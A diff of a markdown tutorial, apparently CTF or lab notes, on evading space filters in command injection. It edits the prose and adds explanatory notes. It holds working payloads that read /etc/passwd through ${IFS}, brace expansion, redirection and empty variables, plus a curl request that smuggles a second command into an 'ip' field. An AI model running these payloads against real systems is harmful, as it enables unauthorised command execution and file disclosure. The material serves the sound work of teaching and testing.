@@ -4,9 +4,9 @@
 
 ## Why Spaces Get Filtered
 
-Inputs that should contain no whitespace (IP, hostname, filename, slug) are easy targets for a space denylist. Block ` ` and you've stopped most casual `; cat /etc/passwd` payloads.
+Inputs that should contain no whitespace — IP addresses, hostnames, filenames, slugs — are easy targets for a space denylist. Blocking the space character stops most casual `; cat /etc/passwd` payloads.
 
-But spaces are also the easiest character to substitute — bash accepts many alternatives.
+But spaces are also the easiest character to substitute. Bash accepts many alternatives.
 
 ---
 
@@ -28,13 +28,14 @@ But spaces are also the easiest character to substitute — bash accepts many al
 
 ## `${IFS}` — The Universal Space Replacement
 
-Bash's `$IFS` (Internal Field Separator) is space-tab-newline by default. When the shell expands `${IFS}` it produces the equivalent of a space:
+Bash's `$IFS` (Internal Field Separator) defaults to space, tab, and newline. When the shell expands `${IFS}` it produces the equivalent of a space.
 
 ```bash
 ls${IFS}-la
 # equivalent to:
 ls -la
 ```
+> Demonstrates the `${IFS}` space substitution. Bash expands the variable to a space before passing arguments to the command. The filter sees no literal space in the input.
 
 Combined with newline (`%0a`) injection:
 ```
@@ -54,6 +55,7 @@ Bash automatically inserts spaces between comma-separated tokens inside braces:
 {cat,/etc/passwd}     →  cat /etc/passwd
 {echo,hello,world}    →  echo hello world
 ```
+> Bash expands brace expressions by inserting spaces between comma-separated tokens. No literal space is ever present in the payload. Use this when both space and common substitution variables are blocked.
 
 URL-friendly because no spaces are ever transmitted:
 ```
@@ -83,6 +85,7 @@ cat</etc/passwd                    # no space, file redirected into cat
 echo "test">/tmp/x                 # no space before /tmp/x
 ls<<<""                            # null heredoc — empty arg
 ```
+> Uses input/output redirection (`<`, `>`, `<<<`) to avoid literal spaces; swap the file paths for your target's readable/writable locations.
 
 Limited utility — only works for commands that read from stdin or accept redirection.
 
@@ -95,6 +98,7 @@ cat$u/etc/passwd
 # $u is undefined → expands to empty string
 # Shell sees: cat /etc/passwd (the $u acts as token separator)
 ```
+> Uses an undefined variable `$u` as a zero-width space replacement; swap the command and file path for your target.
 
 Or use builtin vars known to be empty:
 ```bash
@@ -129,6 +133,7 @@ curl -sk -X POST "http://154.57.164.73:30363/" \
   --data-urlencode 'ip=127.0.0.1
 ${IFS}ls${IFS}-la'
 ```
+> The literal newline inside the `--data-urlencode` string becomes `%0A` on the wire. `${IFS}` replaces spaces around the `ls` flags. Both bypasses work together because the filter blocks `;` and spaces but not newlines or `${IFS}`.
 
 (The newline in `--data-urlencode` becomes `%0A` on the wire.)
 
